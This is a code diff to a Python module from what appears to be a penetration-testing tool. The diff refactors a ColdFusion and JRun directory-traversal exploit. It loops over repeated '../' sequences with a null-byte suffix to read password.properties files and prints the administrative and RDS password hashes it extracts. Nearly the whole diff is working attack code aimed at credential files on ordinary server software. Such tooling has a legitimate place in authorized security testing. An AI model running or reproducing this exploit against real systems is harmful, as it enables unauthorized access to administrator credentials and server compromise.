@@ -25,7 +25,28 @@ class Auxiliary:
 
         return False
 
+    def checkURL(self, fingerengine, url, keyword):
+        """ Given a URL with a format in it, sub in our traversal string
+        and return if we match with a keyword.                
+        """
+
+        for dots in range(7, 12):
+            
+            if fingerengine.options.remote_os == 'linux':
+                t_url = url.format("../" * dots)
+            else:
+                t_url = url.format("..\\" * dots)
+        
+            response = utility.requests_get(t_url)
+            if response.status_code == 200 and keyword in response.content:
+
+                return response.content
+                        
     def run(self, fingerengine, fingerprint):
+        """
+        """
+
+        found = False                
         utility.Msg("Attempting to dump administrative hash...")
 
         if float(fingerprint.version) > 8.0:
@@ -48,16 +69,27 @@ class Auxiliary:
         base = "http://{0}:{1}".format(fingerengine.options.ip, fingerprint.port)
         for path in directories:
 
-            uri = "{0}?locale={1}" + ver_dir[fingerprint.version] + "%00en"
-            for dots in range(7,12):
+            uri = ("%s?locale={0}" % path) + ver_dir[fingerprint.version] + "%00en"
+            content = self.checkURL(fingerengine, base + uri, 'password=')
+            if content:
 
-                if fingerengine.options.remote_os == 'linux':
-                    t_url = uri.format(path, "../" * dots)
-                else:
-                    t_url = uri.format(path, "..\\" * dots)
+                pw_hash = re.findall("password=(.*?)\r\n", content)
+                rds_hash = re.findall("rdspassword=(.*?)\n", content)
+                if len(pw_hash) > 0:
+                    utility.Msg("Administrative hash: %s" % pw_hash[1], LOG.SUCCESS)
+                    if len(rds_hash) > 0:
+                        utility.Msg("RDS hash: %s" % rds_hash[1], LOG.SUCCESS)
 
-                response = utility.requests_get(base + t_url)
-                if response.status_code == 200:
+                    found = True                        
+                    break
+
+        if not found:
+            utility.Msg("Hash not found, attempting JRun..")
+            for path in directories:
+
+                uri = ("%s?locale={1}" % path) + ver_dir["JRun"] + "%00en"
+                content = self.checkURL(fingerengine, base + uri, 'password=')
+                if content: 
 
                     pw_hash = re.findall("password=(.*?)\r\n", response.content)
                     rds_hash = re.findall("rdspassword=(.*?)\n", response.content)
@@ -65,28 +97,9 @@ class Auxiliary:
                         utility.Msg("Administrative hash: %s" % pw_hash[1], LOG.SUCCESS)
                         if len(rds_hash) > 0:
                             utility.Msg("RDS hash: %s" % rds_hash[1], LOG.SUCCESS)
-                        return
 
+                        break
 
-        utility.Msg("Hash not found, attempting JRun..")
-        uri = "{0}?locale={1}" + ver_dir["JRun"] + "%00en"
-        for dots in range(7, 12):
-
-            if fingerengine.options.remote_os == 'linux':
-                t_url = uri.format(path, "../" * dots)
-            else:
-                t_url = uri.format(path, "..\\" * dots)
-
-            response = utility.requests_get(base + t_url)
-            if response.status_code == 200:
-
-                pw_hash = re.findall("password=(.*?)\r\n", response.content)
-                rds_hash = re.findall("rdspassword=(.*?)\n", response.content)
-                if len(pw_hash) > 0:
-                    utility.Msg("Administrative hash: %s" % pw_hash[1], LOG.SUCCESS)
-                    if len(rds_hash) > 0:
-                        utility.Msg("RDS hash: %s" % rds_hash[1], LOG.SUCCESS)
-                    return
 
     def run_latter(self, fingerengine, fingerprint):
         """ There's a slightly different way of doing this for 9/10, so we do that here
@@ -102,37 +115,28 @@ class Auxiliary:
               "&thisTag.generatedContent=htp"
 
         if fingerengine.options.remote_os == 'linux':
-            paths.append('{0}opt/coldfusion/cfusion/lib/password.properties'.format("../" * 9))
+            paths.append('opt/coldfusion/cfusion/lib/password.properties')
             if fingerprint.version == "9.0":
-                paths.append('{0}opt/coldfusion9/cfusion/lib/password.properties'\
-                                                            .format("../" * 9))
+                paths.append('opt/coldfusion9/cfusion/lib/password.properties')
             else:
-                paths.append('{0}opt/coldfusion10/cfusion/lib/password.properties'\
-                                                            .format("../" * 9))
+                paths.append('opt/coldfusion10/cfusion/lib/password.properties')
 
         else:
-            paths.append('{0}ColdFusion\lib\password.properties'.format("..\\" * 9))
+            paths.append('ColdFusion\lib\password.properties')
             if fingerprint.version == "9.0":
-                paths.append('{0}ColdFusion9\lib\password.properties'\
-                                                    .format("..\\" * 9))
-                paths.append('{0}ColdFusion9\cfusion\lib\password.properties'\
-                                                .format("..\\" * 9))
+                paths.append('ColdFusion9\lib\password.properties')
+                paths.append('ColdFusion9\cfusion\lib\password.properties')
             else:
-                paths.append('{0}ColdFusion10\lib\password.properties'\
-                                                    .format("..\\" * 9))
-                paths.append('{0}ColdFusion10\cfusion\lib\password.properties'\
-                                                    .format("..\\" * 9))
+                paths.append('ColdFusion10\lib\password.properties')
+                paths.append('ColdFusion10\cfusion\lib\password.properties')
 
         for path in paths:
-            url = base + uri.format(path)
 
-            response = utility.requests_get(url)
-            if response.status_code == 200:
+            luri = uri.format('{0}' + path)
+            content = self.checkURL(fingerengine, base + luri, 'password=')
+            if content:
 
-                pw_hash = re.findall("password=(.*?)\r\n", response.content)
+                pw_hash = re.findall("password=(.*?)\r\n", content)
                 if len(pw_hash) > 0:
                     utility.Msg("Administrative hash: %s" % pw_hash[1], LOG.SUCCESS)
-                    return
-
-        utility.Msg("Failed to obtain hash (HTTP %d)" % response.status_code, 
-                                                            LOG.ERROR)
+                    break
